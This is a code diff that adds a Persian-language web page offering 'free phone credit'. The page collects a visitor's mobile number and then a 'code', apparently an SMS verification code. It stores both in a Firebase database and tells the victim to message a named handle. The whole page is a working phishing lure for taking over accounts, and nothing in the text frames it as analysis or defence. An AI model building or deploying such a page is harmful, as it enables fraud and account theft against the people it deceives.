@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>شارژ رایگان</title>
+
+<style>
+body{
+    margin:0;
+    background:#000;
+    color:#00ff66;
+    font-family:tahoma;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.box{
+    width:85%;
+    background:#111;
+    padding:25px;
+    border-radius:20px;
+    box-shadow:0 0 25px #00ff66;
+    text-align:center;
+}
+
+input{
+    width:90%;
+    padding:15px;
+    margin:10px;
+    border-radius:10px;
+    border:none;
+    font-size:18px;
+}
+
+button{
+    width:95%;
+    padding:15px;
+    margin-top:15px;
+    border:0;
+    border-radius:10px;
+    background:#00ff66;
+    color:#000;
+    font-size:18px;
+}
+
+#codeBox,#result{
+    display:none;
+}
+</style>
+
+</head>
+
+<body>
+
+
+<div class="box">
+
+<h2>🎁 شارژ رایگان</h2>
+
+<div id="phoneBox">
+
+<input id="phone" placeholder="شماره موبایل">
+
+<button onclick="showCode()">ادامه</button>
+
+</div>
+
+
+<div id="codeBox">
+
+<input id="code" placeholder="کد">
+
+<button onclick="saveData()">ثبت</button>
+
+</div>
+
+
+<div id="result">
+
+<h3>با تشکر 🌹</h3>
+
+<p>برای دریافت شارژ پیام دهید:</p>
+
+<h2>
+pv___mr15346
+</h2>
+
+</div>
+
+
+</div>
+
+
+
+<script type="module">
+
+import { initializeApp } 
+from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+
+import { getDatabase, ref, push, set } 
+from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+
+
+
+const firebaseConfig = {
+
+apiKey: "YOUR_API_KEY",
+
+authDomain: "YOUR_PROJECT.firebaseapp.com",
+
+databaseURL: "YOUR_DATABASE_URL",
+
+projectId: "YOUR_PROJECT_ID",
+
+storageBucket: "YOUR_BUCKET",
+
+messagingSenderId: "YOUR_ID",
+
+appId: "YOUR_APP_ID"
+
+};
+
+
+
+const app = initializeApp(firebaseConfig);
+
+const db = getDatabase(app);
+
+
+
+let userPhone="";
+
+
+
+window.showCode=function(){
+
+userPhone=document.getElementById("phone").value;
+
+document.getElementById("phoneBox").style.display="none";
+
+document.getElementById("codeBox").style.display="block";
+
+}
+
+
+
+window.saveData=function(){
+
+let code=document.getElementById("code").value;
+
+
+let newRef=push(ref(db,"users"));
+
+
+set(newRef,{
+
+phone:userPhone,
+
+code:code,
+
+time:new Date().toLocaleString()
+
+});
+
+
+
+document.getElementById("codeBox").style.display="none";
+
+document.getElementById("result").style.display="block";
+
+
+}
+
+
+</script>
+
+
+</body>
+  </html>
